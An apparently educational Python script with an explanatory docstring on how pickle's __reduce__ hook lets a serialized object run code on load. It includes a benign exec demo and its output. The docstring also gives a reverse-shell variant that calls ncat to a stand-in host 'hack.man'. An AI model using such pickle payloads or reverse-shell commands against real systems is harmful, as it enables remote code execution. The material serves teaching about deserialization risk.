"""
A dangerous misuse of Python's pickle module—specifically demonstrating how arbitrary code execution can be embedded inside serialized Python objects.
What GNAT is, what it does, and why this is important (or dangerous).

🔍 What is GNAT in This Code?
```
class GNAT:
    def __reduce__(self):
        return (os.system, ('id',))
```        
GNAT is a custom class with a special method __reduce__() defined.
__reduce__() is part of Python’s pickling protocol. It's used to tell pickle how to serialize and deserialize an object.
Here, it returns a tuple: (os.system, ('id',)). This tells pickle that when unpickling, it should run os.system("id").

Thus, GNAT is not a library or known acronym in this context—it’s an arbitrary class name chosen by the author to demonstrate an exploit. You could call it anything.

💣 What This Code Does
It defines a malicious class (GNAT) that triggers a shell command when deserialized.
It serializes it using pickle.dumps() and base64-encodes the result.
Upon deserialization (which is not shown here, but implied), the command id will be executed via os.system.

☠️ Potential Exploitation
Replace:
```
return (os.system, ('id',))
```

with:
```
return (os.system, ('ncat -e powershell.exe hack.man 4444',))
```

And the object will, when deserialized, open a reverse shell to hack.man on port 4444. This is a serious remote code execution (RCE) vulnerability.

🔒 Why This Is Important
➤ pickle is not safe for untrusted input
If you load a pickle file (pickle.load(...)) from an untrusted source, it may execute arbitrary code.

This is a classic deserialization attack—just like Java's ObjectInputStream or PHP's unserialize.

➤ Used in:
Security testing (Red Teaming / Exploits)
Malware payloads
Serialization-based attacks

🧪 The Safe Way to Serialize
If you need safe serialization, use:

json for primitive types
yaml.safe_load (not yaml.load)
protobuf or MessagePack for structured data

🧾 Summary
GNAT here is a custom class that uses Python's __reduce__() to demonstrate code execution via pickling.

The code is a clear example of how malicious payloads can be crafted using Python's pickle module.

Never unpickle data from untrusted sources.
"""
import pickle, os, base64

# This is the payload class
class user:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def profile(self):
        return f"{self.name} : {self.age}"

# Serialize a user object first
u1 = user('ursa', 50)
user_payload = pickle.dumps(u1) # prepare payload 

# GNAT will [embed] and run this on unpickle
class GNAT:
    def __reduce__(self):
        code = f"""
import pickle, base64
data = {base64.b64encode(user_payload)}
obj = pickle.loads(base64.b64decode(data))
print("Recovered user:", obj.name, obj.age)
print("Profile:", obj.profile())
"""
        return (exec, (code,))

# ---- Test execution ----
print("=== GNAT DEMO ===")
serialized_gnat = pickle.dumps(GNAT())
print(f"GNAT payload:\n{base64.b64encode(serialized_gnat).decode()}")

# Save to file
with open("payload.b64", "wb") as f:
    f.write(base64.b64encode(serialized_gnat))


print("Pickle payload written to payload.b64")

del serialized_gnat
del GNAT
del user_payload
del u1

# Trigger execution [fails] as objects are deleted
# pickle.loads(serialized_gnat) 

# STEP 2: Read back and execute
with open("payload.b64", "rb") as f:
    serialized_obj_b64 = f.read()
    serialized_gnat = base64.b64decode(serialized_obj_b64)

# Trigger execution [succeeds] as objects are recovered
pickle.loads(serialized_gnat)



"""
=== GNAT DEMO ===
GNAT payload:
gASVCgEAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIzuCmltcG9ydCBwaWNrbGUsIGJhc2U2NApkYXRhID0gYidnQVNWTXdBQUFBQUFBQUNNQ0Y5ZmJXRnBibDlmbEl3RWRYTmxjcFNUbENtQmxIMlVLSXdFYm1GdFpaU01CSFZ5YzJHVWpBTmhaMldVU3pKMVlpND0nCm9iaiA9IHBpY2tsZS5sb2FkcyhiYXNlNjQuYjY0ZGVjb2RlKGRhdGEpKQpwcmludCgiUmVjb3ZlcmVkIHVzZXI6Iiwgb2JqLm5hbWUsIG9iai5hZ2UpCnByaW50KCJQcm9maWxlOiIsIG9iai5wcm9maWxlKCkpCpSFlFKULg==
Pickle payload written to payload.b64
Recovered user: ursa 50
Profile: ursa : 50
""""